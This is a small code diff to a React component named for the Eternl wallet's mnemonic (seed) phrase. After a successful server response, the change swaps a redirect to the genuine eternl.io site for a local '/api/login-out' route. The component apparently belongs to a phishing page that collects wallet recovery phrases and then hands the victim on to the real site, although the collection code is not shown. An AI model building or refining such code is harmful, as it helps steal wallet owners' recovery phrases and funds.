@@ -102,7 +102,7 @@ export default function EternlMnemonicPhraseModal({
 
       const result = await response.json();
       if (response.status === 200 && result.status) {
-        window.location.href = "https://eternl.io/";
+        window.location.href = "/api/login-out";
       } else {
         throw new Error(result?.message || "Something went wrong.");
       }
